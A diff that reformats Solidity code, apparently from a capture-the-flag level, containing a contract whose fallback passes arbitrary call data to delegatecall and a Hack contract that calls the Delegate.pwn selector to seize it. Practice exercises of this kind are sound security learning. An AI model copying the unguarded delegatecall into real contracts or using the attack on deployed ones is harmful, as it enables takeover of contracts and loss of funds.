@@ -23,7 +23,7 @@ contract Delegation {
     }
 
     fallback() external {
-        (bool result, ) = address(delegate).delegatecall(msg.data);
+        (bool result,) = address(delegate).delegatecall(msg.data);
         if (result) {
             this;
         }
@@ -40,9 +40,7 @@ contract Hack {
     }
 
     function hack() public {
-        (bool success, ) = address(target).call(
-            abi.encodeWithSelector(Delegate.pwn.selector)
-        );
+        (bool success,) = address(target).call(abi.encodeWithSelector(Delegate.pwn.selector));
         require(success, "Delegate call failed");
     }
 }
